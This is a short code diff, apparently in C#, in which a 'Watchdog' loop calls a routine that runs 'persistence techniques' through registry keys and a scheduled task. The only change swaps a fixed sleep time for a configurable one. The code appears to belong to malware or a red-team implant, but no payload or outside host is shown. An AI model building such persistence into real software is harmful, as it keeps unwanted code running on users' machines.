@@ -58,7 +58,7 @@ class Watchdog
             Persistence.runAllTechniques(); // sets and checks the registry keys and scheduled task
 
             watchdogHelper.Log("Watchdog is ran its loop");
-            Thread.Sleep(300);  // Sleep
+            Thread.Sleep(Config.sleepTime);  // Sleep
         }
      }
 
